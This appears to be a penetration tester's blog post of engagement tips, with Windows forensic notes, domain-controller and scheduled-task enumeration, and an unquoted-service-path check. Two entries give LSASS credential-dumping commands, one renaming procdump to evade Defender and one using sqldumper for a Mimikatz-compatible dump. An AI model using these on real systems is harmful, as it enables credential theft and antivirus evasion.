---
title: "Defensive Notes" 
layout: "post"
---

Some notes and tricks that helped me during engagement


## 1) Notepad cache

```powershell
[lazy]People like me use __Notepad++__ as a note-taking thing. We create a 'new', then never get around to saving them.

They get cached here:
C:\Users\{username}\AppData\Roaming\Notepad++\backup
```

## 2) Procdump.exe 

```powershell
If you rename __procdump.exe to __dump64.exe__ and place it in the "C:\Program Files (x86)\Microsoft Visual Studio\*" folder, you can bypass Defender and dump __LSASS__.
```

## 3) Malicious Macro Enabled

```powershell
How to prove malicious macro was enabled & clicked? 👀 #DFIR 

HKEY_LOCAL_MACHINE\USERDAT\Software\Microsoft\Office\<VERS>\<PROGRAM>\Security\Trusted Documents\TrustRecords 

Look ONLY for values where last four bytes are "FF FF FF 7F". 

These files had macros enabled
```


## 4) SQLdumper LSASS

```powershell
0x01100:40 flag will create a Mimikatz compatible dump file.

sqldumper.exe 540 0 0x01100:40

Usecase: Dump LSASS.exe to Mimikatz compatible dump using PID.
```

## 5) Powershell domain control enumerations

```powershell
powershell detect domain controller 

$F = [system.directoryservices.activedirectory.Forest]::GetCurrentForest();$F.domains | ForEach-Object {$_.DomainControllers} | ForEach-Object {$_.Name + " " + $_.IPAddress}
```

## 6) Document all tasks in task scheduler

	```powershell
$outcsv = "c:\temp\taskdef.csv" ; Get-ScheduledTask | ForEach-Object { [pscustomobject]@{ Name = $_.TaskName; Path = $_.TaskPath;LastResult = $(($_ | Get-ScheduledTaskInfo).LastTaskResult);NextRun = $(($_ | Get-ScheduledTaskInfo).NextRunTime);Status = $_.State;Command = $_.Actions.execute;Arguments = $_.Actions.Arguments }} |Export-Csv -Path $outcsv -NoTypeInformation -Force
	
	
#Get Schedule Tasks from within powershell

powershell Get-ScheduledTask

#We can remove all tasks located under the /Microsoft/Windows/ path, most of the time, it is the default scheduled tasks.

Get-ScheduledTask | Select * | ? {$_.TaskPath -notlike "\Microsoft\Windows\*"} | Format-Table -Property State, Actions, Date, TaskPath, TaskName, @{Name="User";Expression={$_.Principal.userID}}
	
#now we can remove the tasks who are executed with the same privilege as our "lowuser" user

Get-ScheduledTask | Select * | ? {($_.TaskPath -notlike "\Microsoft\Windows\*") -And ($_.Principal.UserId -notlike "*$env:UserName*")} | Format-Table -Property State, Actions, Date, Task
Path, TaskName, @{Name="User";Expression={$_.Principal.userID}}

#We can use this following PowerShell commands to get the interval of execution of the Task.

$task= Get-ScheduledTask -TaskName Task1
ForEach ($triger in $task.Triggers) { echo $triger.Repetition.Interval}

#We can find the actions of this task with these commands

$task= Get-ScheduledTask -TaskName Task1
ForEach ($action in $task.Actions) { Select $action.Execute}

#As a low privilege user we have to check if we can overwrite this file. Using icacls or accesschk64.exe
```
	
## 7) Unquoted Service Path 

wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """